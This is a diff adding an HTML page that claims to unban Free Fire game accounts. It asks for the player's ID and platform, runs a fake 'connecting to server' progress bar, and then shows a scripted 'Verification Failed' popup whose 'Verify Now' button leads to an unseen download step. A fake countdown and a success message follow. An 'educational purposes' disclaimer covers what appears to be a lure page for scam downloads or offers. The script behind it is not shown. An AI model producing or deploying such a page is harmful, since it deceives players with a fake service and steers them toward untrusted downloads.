@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF ID UNBAN</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</head>
+<body>
+    <header class="header">
+        <h1>FF ID UNBAN</h1>
+    </header>
+    
+    <div class="container">
+        <h1>FF ID UNBAN</h1>
+        <form id="unbanForm">
+            <div class="form-group">
+                <label for="userId">Enter your ID:</label>
+                <input type="number" id="userId" name="userId" placeholder="Enter your ID" required>
+            </div>
+            <div class="form-group">
+                <label for="platform">Select Platform:</label>
+                <select id="platform" name="platform" required>
+                    <option value="" disabled selected>Select your platform</option>
+                    <option value="ios">iOS</option>
+                    <option value="android">Android</option>
+                </select>
+            </div>
+            <button type="submit">Submit</button>
+        </form>
+
+        <!-- Progress Bar and Message -->
+        <div class="progress-container" id="progressContainer" style="display: none; margin-top: 5px;">
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar">
+                    <span id="percentage">0%</span>
+                </div>
+            </div>
+            <p id="progressMessage">Connecting to server...</p>
+        </div>
+
+        <!-- Popup Modal -->
+        <div class="popup-modal" id="popupModal" style="display: none;">
+            <div class="popup-content" id="popupContent">
+                <i class="fas fa-exclamation-triangle warning-icon"></i>
+                <h2 id="popupTitle">Verification Failed</h2>
+                <div class="progress-bar-container">
+                    <div class="progress-bar" id="popupProgressBar">
+                        <span id="popupPercentage">90%</span>
+                    </div>
+                </div>
+                <p id="popupMessage">
+                    Unfortunately, we couldn't verify your ID. To unban your account, 
+                    please click on verify now button and complete the verification
+                </p>
+                <button id="downloadButton">Verify Now</button>
+            </div>
+        </div>
+
+        <!-- Verifying Modal (matches the Download Modal size) -->
+        <div id="timerModal" style="display: none;">
+            <div class="popup-content">
+                <h2>Verifying, Please Wait...</h2>
+                <div class="progress-bar-container">
+                    <div class="progress-bar" id="timerProgressBar"></div>
+                </div>
+                <p id="timerText">30 seconds remaining...</p>
+            </div>
+        </div>
+
+        <!-- Success Modal -->
+        <div id="successModal" style="display: none;">
+            <div class="popup-content">
+                <i class="fas fa-check-circle success-icon"></i>
+                <h2>Success!</h2>
+                <p>Your ID has been unbanned successfully. Thanks for using our website!</p>
+                <button id="unbanNewIdButton">Unban New ID</button>
+            </div>
+        </div>
+
+        <!-- Notice Section -->
+        <div class="notice">
+            <h3>Notice</h3>
+            <ul>
+                <li>This project is solely for educational purposes and is not affiliated with Free Fire or its parent company.</li>
+                <li>No personal data is collected or stored during the use of this project.</li>
+                <li>We do not collect any payment or fees. This service is completely free.</li>
+                <li>By using this project, you agree that it is intended for learning and demonstration only.</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Overlay for the popup -->
+    <div id="popupOverlay" class="popup-overlay" style="display: none;"></div>
+    <script src="https://kit.fontawesome.com/69d6fd586e.js" crossorigin="anonymous"></script>
+    <script src="script.js"></script>
+</body>
+
+</html>
